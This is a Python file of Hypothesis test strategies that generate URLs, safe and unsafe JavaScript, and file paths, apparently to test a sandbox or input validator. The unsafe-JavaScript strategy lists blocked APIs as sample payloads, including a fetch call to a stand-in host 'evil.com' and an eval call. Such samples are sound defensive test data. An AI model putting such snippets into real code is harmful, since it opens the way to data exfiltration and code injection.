def valid_http_urls() -> st.SearchStrategy[str]:
    """Strategy for generating valid HTTP(S) URLs with public IPs."""
    schemes = st.just("http") | st.just("https")
    public_ips = st.sampled_from([
        "8.8.8.8", "1.1.1.1", "44.55.66.77", "99.88.77.66", "8.26.56.26",
    ])
    paths = st.text(
        alphabet=st.characters(
            blacklist_categories=("Cc", "Cs"),
            blacklist_characters="\r\n",
        ),
        min_size=0, max_size=100,
    ).filter(lambda s: not any(c in s for c in " \r\n<>"))

    def build_url(scheme: str, ip: str, path: str) -> str:
        return f"{scheme}://{ip}/{path}" if path else f"{scheme}://{ip}/"

    return st.builds(build_url, schemes, public_ips, paths)


def safe_javascript() -> st.SearchStrategy[str]:
    """Strategy for generating safe JavaScript."""
    statements = st.sampled_from([
        "console.log('hello');",
        "const x = 42;",
        "if (true) { console.log('test'); }",
        "const arr = [1, 2, 3];",
        "const obj = {a: 1, b: 2};",
    ])
    return st.lists(statements, min_size=1, max_size=5).map(lambda s: "\n".join(s))


def unsafe_javascript() -> st.SearchStrategy[str]:
    """Strategy for generating JavaScript with blocked APIs."""
    dangerous = st.sampled_from([
        "fetch('https://evil.com')",
        "eval('malicious')",
        "new Function('return this')",
        "XMLHttpRequest",
    ])
    return st.builds(lambda d: f"const bad = {d};", dangerous)


def safe_file_paths() -> st.SearchStrategy[str]:
    """Strategy for generating safe file paths."""
    base = str(Path.home() / ".loom")
    component = st.text(
        alphabet="abcdefghijklmnopqrstuvwxyz0123456789_",
        min_size=1, max_size=20,
    )

    def build_path(components: list[str]) -> str:
        if not components:
            return base
        parts = [base] + components + ["file.txt"]
        return str(Path(*parts))

    return st.builds(build_path, st.lists(component, max_size=3))


